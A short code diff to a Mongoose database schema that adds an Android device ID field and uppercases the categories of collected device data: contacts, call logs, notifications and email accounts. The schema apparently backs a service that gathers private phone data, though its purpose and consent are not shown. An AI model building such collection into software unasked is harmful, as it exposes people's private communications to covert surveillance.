@@ -10,12 +10,16 @@ const deviceDataSchema = new mongoose.Schema({
         type: String,
         required: true
     },
+    androidId: {
+        type: String,
+        required: true
+    },
     deviceName: String,
     deviceModel: String,
     dataType: {
         type: String,
         required: true,
-        enum: ['contacts', 'call_logs', 'notifications', 'email_accounts']
+        enum: ['CONTACTS', 'CALL_LOGS', 'NOTIFICATIONS', 'EMAIL_ACCOUNTS']
     },
     data: {
         type: mongoose.Schema.Types.Mixed,
